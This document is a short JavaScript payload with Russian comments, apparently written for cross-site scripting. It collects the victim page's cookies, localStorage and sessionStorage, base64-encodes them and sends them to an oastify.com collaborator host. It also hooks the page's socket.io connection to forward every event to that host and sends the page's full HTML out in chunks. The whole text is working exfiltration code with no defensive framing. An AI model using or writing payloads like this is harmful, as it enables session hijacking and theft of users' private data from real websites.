(function(){
  try {
    // Слить базовые данные
    let data = {
      cookie: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage)
    };
    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?base=" + btoa(JSON.stringify(data)));

    // Подключиться к socket.io (он уже есть на странице)
    if (typeof io !== "undefined") {
      var s = io(window.location.origin, { path: "/socket.io" });
      s.onAny((event, ...args) => {
        fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?evt=" 
              + encodeURIComponent(event) 
              + "&d=" + btoa(JSON.stringify(args)))
          .catch(()=>{});
      });
    }

    // Слить HTML по кускам (если большой)
    let html = document.documentElement.innerHTML;
    for (let i = 0; i < html.length; i+=1500) {
      fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?html=" 
            + btoa(html.slice(i, i+1500)))
        .catch(()=>{});
    }
  } catch(e) {
    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?err=" 
          + encodeURIComponent(e.toString()));
  }
})();
